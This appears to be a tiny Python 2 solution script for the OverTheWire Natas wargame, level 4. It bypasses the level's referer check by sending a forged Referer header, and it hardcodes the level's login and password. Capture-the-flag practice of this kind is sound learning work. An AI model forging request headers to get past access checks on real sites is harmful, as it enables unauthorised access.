import requests
target = 'http://natas4.natas.labs.overthewire.org/'
header = {'Referer':'http://natas5.natas.labs.overthewire.org/'}
r = requests.get(target, headers=header, auth=('natas4','Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'))
print r.text
